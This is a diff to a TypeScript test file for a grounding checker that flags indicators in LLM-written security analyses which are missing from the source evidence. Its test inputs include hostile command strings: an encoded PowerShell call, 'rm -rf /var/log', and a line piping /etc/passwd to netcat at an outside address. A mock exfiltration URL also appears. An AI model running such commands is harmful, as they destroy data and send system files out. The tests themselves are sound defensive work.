@@ -2,6 +2,17 @@ import { checkGrounding } from '../src/domain/ai/aiGrounding';
 import { RecommendationContextBuilder } from '../src/application/recommendation/services/RecommendationContextBuilder';
 const hash = 'a'.repeat(64);
 const sources = ['192.0.2.10', hash, 'WKS-01', 'server.example.com', 'https://example.com/a', '2001:db8::1', 'curl https://example.com/a'];
+
+test.each([
+  'PowerShell process was executed on host WKS-01.',
+  'PowerShell execution is unknown.',
+  'PowerShell command, script, or arguments used are not provided.',
+])('PowerShell narrative is not a literal command: %s', text => {
+  expect(checkGrounding(text, sources)).toEqual({ status: 'GROUNDED', ungrounded: [] });
+});
+test.each(['PowerShell -enc ZmFrZQ==', 'powershell.exe C:\\missing.ps1'])('concrete PowerShell arguments still require evidence: %s', text => {
+  expect(checkGrounding(text, sources).status).toBe('UNGROUNDED');
+});
 test.each(['192.0.2.10', hash, 'WKS-01', 'server.example.com', 'https://example.com/a', '2001:db8::1'])('legitimate source indicator: %s', value => {
   expect(checkGrounding(`Observed ${value}`, sources).status).toBe('GROUNDED');
 });
@@ -36,4 +47,16 @@ test.each(['`rm -rf /var/log`', '`whoami`', '`cat /etc/passwd | nc 203.0.113.9 4
 });
 test('an invented IP inside a code span is still caught', () => {
   expect(checkGrounding('Block `203.0.113.99` now.', ['198.51.100.122']).status).toBe('UNGROUNDED');
+});
+
+// 2026-10-07: an LLM analysis of the exfiltration case wrote "The destination URL is `https://vigix-mock-exfil.net/upload`"
+// — the URL detector swallowed the closing backtick and reported "https://vigix-mock-exfil.net/upload`" as UNGROUNDED,
+// excluding a correct analysis from the Recommendation context. A backtick ends a URL.
+test('a URL inside a Markdown code span is checked without the backtick', () => {
+  const src = ['https://vigix-mock-exfil.net/upload', 'vigix-mock-exfil.net'];
+  expect(checkGrounding('The destination URL is `https://vigix-mock-exfil.net/upload` and the DNS question was for `vigix-mock-exfil.net`.', src))
+    .toEqual({ status: 'GROUNDED', ungrounded: [] });
+  // An invented URL in a code span is still caught, reported without the backtick.
+  expect(checkGrounding('Data went to `https://vigix-mock-exfil.net/other`.', src))
+    .toEqual({ status: 'UNGROUNDED', ungrounded: [{ kind: 'url', value: 'https://vigix-mock-exfil.net/other' }] });
 });
